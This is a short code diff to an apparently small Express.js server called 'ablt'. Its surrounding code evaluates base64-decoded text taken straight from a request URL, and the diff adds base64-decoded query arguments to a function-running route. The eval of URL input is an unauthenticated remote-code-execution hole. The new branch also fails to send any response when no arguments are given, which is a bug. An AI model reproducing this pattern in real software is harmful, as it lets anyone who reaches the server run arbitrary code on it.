@@ -6,7 +6,12 @@ app.get('/ablt/attach/:code', (req, res) => {
   function ABLT_FN(name, fn){
 	var fne;
 	app.get("/ablt/run/" + name, (req, res) => {
-		res.send(fn())
+		if (req.query.args) {
+			var args = atob(req.query.args).split(",");
+			res.send(fn(...args))
+		} else {
+			fn()
+		}
 	})
   }
   eval(atob(req.params.code))
